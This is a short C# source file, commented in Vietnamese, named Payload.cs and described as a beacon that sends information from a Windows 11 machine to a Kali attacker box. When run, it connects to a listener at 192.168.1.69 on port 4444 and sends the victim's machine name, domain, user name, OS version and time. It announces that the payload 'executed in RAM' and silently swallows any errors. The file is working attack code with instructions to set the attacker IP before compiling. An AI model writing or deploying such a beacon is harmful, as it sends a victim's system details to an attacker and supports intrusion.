// Payload.cs — Beacon gửi thông tin máy Win11 về Kali
// Thay KALI_IP thành IP máy Kali của bạn trước khi compile
using System;
using System.Net.Sockets;
using System.Text;

public class Target
{
    private const string LISTENER_IP   = "192.168.1.69";  // ← đổi thành IP Kali
    private const int    LISTENER_PORT = 4444;

    public static void Run()
    {
        try
        {
            using (var client = new TcpClient(LISTENER_IP, LISTENER_PORT))
            using (var stream = client.GetStream())
            {
                string msg = string.Format(
                    "\n[+] SUCCESS: Payload executed in RAM!\n" +
                    "[+] Machine : {0}\n" +
                    "[+] User    : {1}\\{2}\n" +
                    "[+] OS      : {3}\n" +
                    "[+] Time    : {4}\n\n",
                    Environment.MachineName,
                    Environment.UserDomainName,
                    Environment.UserName,
                    Environment.OSVersion,
                    DateTime.Now);

                byte[] data = Encoding.UTF8.GetBytes(msg);
                stream.Write(data, 0, data.Length);
            }
        }
        catch { }
    }
}